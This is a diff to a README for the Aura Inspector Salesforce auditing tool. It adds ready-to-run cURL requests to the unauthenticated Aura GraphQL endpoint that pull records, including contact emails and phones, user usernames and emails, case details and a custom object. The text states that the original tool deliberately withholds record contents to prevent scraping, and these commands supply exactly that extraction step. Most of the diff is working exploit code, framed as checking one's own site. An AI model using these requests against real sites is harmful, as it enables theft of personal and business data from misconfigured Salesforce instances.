@@ -64,17 +64,51 @@ You will find the following structure:
 As described by Mandiant, the public version of Aura Inspector **intentionally does not download the actual records (the raw data contents)** to prevent malicious data-scraping misuse. It only flags the **Object Names** (e.g., `Account`, `Contact`, `Opportunity`, `User`) and **How many records are exposed**.
 
 #### How to see the actual fields being leaked:
-If the tool tells you that the `Account` object has 1,500 exposed records in `summary.txt`, you can use **cURL** to reconstruct the exact GraphQL request that reproduces the leak and shows you the actual data:
+If the tool tells you that the `Account` object has 1,500 exposed records in `summary.txt`, you can use **cURL** to reconstruct the exact GraphQL request that reproduces the leak and shows you the actual data.
 
-Open your terminal and run the following matching the target URL and the **Object Name** the tool flagged:
+Open your terminal and run the following matching the target URL and the **Object Name** the tool flagged. Below are examples for common objects like `Account`, `Contact`, `User`, and `Case`.
 
+##### Extracting `Account`
 ```powershell
 curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
   -H "Content-Type: application/x-www-form-urlencoded" `
   -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:10){edges+{node+{+Name+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
   -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
 ```
-*Change `Account` inside the `query` above to whichever object you want to inspect. This will return a JSON blob containing the first 10 accounts and their specific names/fields.*
+
+##### Extracting `Contact`
+```powershell
+curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+  -H "Content-Type: application/x-www-form-urlencoded" `
+  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"contacts","query":"query+contacts+{uiapi+{query+{Contact(first:10){edges+{node+{+Name+{+value+},+Email+{+value+},+Phone+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
+  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
+```
+
+##### Extracting `User`
+```powershell
+curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+  -H "Content-Type: application/x-www-form-urlencoded" `
+  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"users","query":"query+users+{uiapi+{query+{User(first:10){edges+{node+{+Name+{+value+},+Username+{+value+},+Email+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
+  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
+```
+
+##### Extracting `Case`
+```powershell
+curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+  -H "Content-Type: application/x-www-form-urlencoded" `
+  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"cases","query":"query+cases+{uiapi+{query+{Case(first:10){edges+{node+{+CaseNumber+{+value+},+Subject+{+value+},+Status+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
+  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
+```
+
+##### Extracting `User_Access_Request__c` (Custom Object)
+```powershell
+curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
+  -H "Content-Type: application/x-www-form-urlencoded" `
+  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"custom_object","query":"query+custom_object+{uiapi+{query+{User_Access_Request__c(first:10){edges+{node+{+Name+{+value+},+Id+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
+  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
+```
+
+*Change the Object inside the `query` above if you find other leaked tables (like `Opportunity` or custom objects ending in `__c`). This will return a JSON blob containing the first 10 records and their specific fields.*
 
 ---
 
